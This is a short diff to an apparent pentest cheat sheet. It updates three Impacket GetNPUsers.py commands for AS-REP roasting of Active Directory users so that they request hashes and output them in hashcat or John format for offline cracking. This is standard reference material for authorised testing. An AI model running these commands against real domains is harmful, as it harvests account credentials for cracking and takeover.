@@ -1,13 +1,13 @@
 % roasting, active-directory
 
 # Get all hash of domain (no preauth roasting)
-GetNPUsers.py <domain>/<user> -request -no-pass -dc-ip <ip>
+GetNPUsers.py <domain>/<user> -request -no-pass -dc-ip <ip> -format <hashcat_john>
 
 # Get user hash from users file (no preauth roasting)
-GetNPUsers.py -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/
+GetNPUsers.py -no-pass -dc-ip <ip> -usersfile <usersfile> <domain>/ -request -format <hashcat_john>
 
 # Get hash for a user (no preauth roasting)
-GetNPUsers.py -no-pass -dc-ip <ip> <domain>/<user>
+GetNPUsers.py -no-pass -dc-ip <ip> <domain>/<user> -request -format <hashcat_john>
 
 % rpc
 
